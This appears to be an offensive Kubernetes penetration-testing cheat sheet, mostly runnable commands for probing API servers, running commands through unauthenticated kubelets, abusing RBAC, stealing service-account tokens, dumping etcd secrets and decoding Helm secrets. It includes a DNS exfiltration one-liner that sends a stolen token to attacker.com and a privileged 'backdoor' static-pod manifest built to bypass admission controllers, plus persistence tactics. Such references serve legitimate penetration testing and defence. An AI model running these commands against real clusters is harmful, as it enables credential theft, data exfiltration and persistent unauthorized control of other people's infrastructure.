# Kubernetes Cluster Attacks

## External Reconnaissance

### Detecting K8s from Outside
| Indicator | Source |
|-----------|--------|
| `x-envoy-upstream-service-time` header | HTTP response (Istio sidecar) |
| Port 6443/8443 open with TLS | nmap (API server) |
| Port 10250 (kubelet), 2379 (etcd) | nmap |
| `*.k8s.*`, `*.kube.*`, `*.eks.*`, `*.gke.*` subdomains | DNS enumeration |
| `server: envoy` or `server: istio-envoy` | HTTP headers |
| Certificate CN/SAN with `kubernetes`, `kube-apiserver` | TLS cert inspection |

### API Server Probing
```bash
# Version disclosure (usually unauthenticated)
curl -sk https://<api>:6443/version
# Unauthenticated pod listing (misconfigured RBAC)
curl -sk https://<api>:6443/api/v1/pods
curl -sk https://<api>:6443/api/v1/namespaces
# Anonymous auth check
curl -sk https://<api>:6443/api/v1/nodes
# If 200 → anonymous has cluster-reader or higher
# If 401 → anonymous disabled (good)
# If 403 → anonymous enabled but RBAC denies (check specific resources)
```

## Kubelet Exploitation

### Unauthenticated Kubelet (Port 10250)
```bash
# List pods on node
curl -sk https://<node>:10250/pods | jq '.items[].metadata.name'
# Execute command in pod
curl -sk https://<node>:10250/run/<namespace>/<pod>/<container> -d "cmd=id"
# Read logs
curl -sk https://<node>:10250/containerLogs/<namespace>/<pod>/<container>
```

### Read-Only Kubelet (Port 10255)
```bash
# No auth required, read-only
curl http://<node>:10255/pods
curl http://<node>:10255/metrics
# Extract: service account tokens, env vars, volume mounts from pod specs
```

## RBAC Exploitation

### Permission Enumeration
```bash
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets --all-namespaces
# Check for wildcard permissions
kubectl get clusterrolebinding -o json | jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects'
```

### Dangerous RBAC Permissions
| Permission | Exploitation |
|-----------|-------------|
| `pods/exec` | Execute commands in any pod |
| `secrets` (get/list) | Read all secrets (tokens, creds, TLS keys) |
| `pods` (create) | Spawn privileged pod for node escape |
| `serviceaccounts/token` (create) | Generate tokens for any SA |
| `nodes/proxy` | Access kubelet API via API server proxy |
| `escalate` | Create roles with more permissions than you have |
| `bind` | Bind any role to any subject |
| `impersonate` | Act as any user/group/SA |

### Service Account Token Theft
```bash
# From inside a pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
# Use token against API server
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets
```

## etcd Exploitation

### Direct Access (Port 2379)
```bash
# Check if exposed
curl -sk https://<etcd>:2379/version
# Dump all keys (contains ALL cluster state including secrets)
etcdctl --endpoints=https://<etcd>:2379 \
  --cert=/path/to/cert --key=/path/to/key --cacert=/path/to/ca \
  get / --prefix --keys-only
# Extract secrets
etcdctl get /registry/secrets --prefix --print-value-only | strings | grep -A2 "password\|token\|key"
```

## Network Policy Bypass

### No Network Policies
```bash
# Check if any NetworkPolicies exist
kubectl get networkpolicy -A
# If empty → all pod-to-pod communication is unrestricted
# Lateral movement: access any service from any pod
```

### DNS-Based Exfiltration
```bash
# Even with egress NetworkPolicies, DNS (port 53) is usually allowed
# Exfiltrate data via DNS queries
cat /etc/resolv.conf  # Find cluster DNS
nslookup $(cat /var/run/secrets/kubernetes.io/serviceaccount/token | base64 | cut -c1-60).attacker.com
```

## Admission Controller Bypass

### Webhook Timeout
- If admission webhook has short timeout and is unreachable → fail-open
- Create resource while webhook is down

### Label/Annotation Manipulation
```bash
# Some policies exempt namespaces with specific labels
kubectl label namespace default pod-security.kubernetes.io/enforce=privileged
```

### Static Pod Injection (Node Access Required)
```bash
# Write pod manifest directly to kubelet's static pod path
cat > /etc/kubernetes/manifests/backdoor.yaml <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: backdoor
  namespace: kube-system
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: shell
    image: alpine
    command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]
    securityContext:
      privileged: true
EOF
# Static pods bypass admission controllers entirely
```

## Supply Chain Attacks

### Image Vulnerabilities
```bash
# Scan images in cluster
kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{end}' | sort -u
# Check for: latest tag, no digest pinning, public registries
trivy image <image>
```

### Helm Chart Secrets
```bash
# Helm stores release data in secrets
kubectl get secrets -A -l owner=helm
kubectl get secret <release> -o jsonpath='{.data.release}' | base64 -d | base64 -d | gzip -d
# May contain: database passwords, API keys, TLS certs in values
```

## Post-Exploitation

### Persistence
- Create new ServiceAccount with cluster-admin binding
- Deploy DaemonSet (runs on every node)
- Modify existing deployment (add sidecar container)
- Create CronJob for periodic callback
- Backdoor admission webhook (intercept all pod creation)

### Lateral Movement
```bash
# Enumerate services
kubectl get svc -A
# Access internal services directly
curl http://<service>.<namespace>.svc.cluster.local:<port>
# Check for services without NetworkPolicy protection
```

## Tools

| Tool | Purpose |
|------|---------|
| kube-hunter | K8s penetration testing |
| kubeaudit | Security auditing |
| peirates | K8s post-exploitation |
| kubectl-who-can | RBAC permission analysis |
| rbac-police | RBAC risk assessment |
| kdigger | Container breakout detection |
| CDK | Container/K8s exploitation toolkit |
| Deepce | Container escape detection |
